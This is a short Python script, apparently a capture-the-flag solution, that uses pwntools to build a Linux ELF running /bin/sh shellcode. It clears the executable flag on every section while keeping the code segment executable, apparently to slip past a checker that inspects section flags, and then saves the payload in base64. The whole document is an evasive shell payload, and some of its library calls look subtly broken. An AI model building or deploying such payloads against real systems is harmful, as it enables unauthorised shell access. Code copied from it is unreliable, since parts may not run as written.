from pwn import *
import base64
from elf import SectionFlags, SegmentFlags, constants

context.arch = 'amd64'

# Generate a simple binary that runs execve("/bin/sh", 0, 0)
shellcode = asm(shellcraft.amd64.linux.sh())

# Create a basic ELF header and program header
elf = ELF.from_bytes(shellcode, vma=0x400000)

# Make sure no sections have the executable flag
for section in elf.sections:
    if section.header.sh_flags & 0x4:  # 0x4 is SHF_EXECINSTR
        section.header.sh_flags &= ~0x4

# But keep our code segment executable
for segment in elf.segments:
    if segment.header.p_type == 1 and segment.header.p_vaddr <= elf.entry < segment.header.p_vaddr + segment.header.p_memsz:
        segment.header.p_flags |= 1  # 1 is PF_X

# Save our ELF
elf.save('payload.elf')

# Encode it to base64
with open('payload.elf', 'rb') as f:
    payload_data = f.read()
    payload_b64 = base64.b64encode(payload_data).decode()

with open('payload.b64', 'w') as f:
    f.write(payload_b64)

print(f"Payload size: {len(payload_data)} bytes")
print("Base64 encoded payload saved to payload.b64")
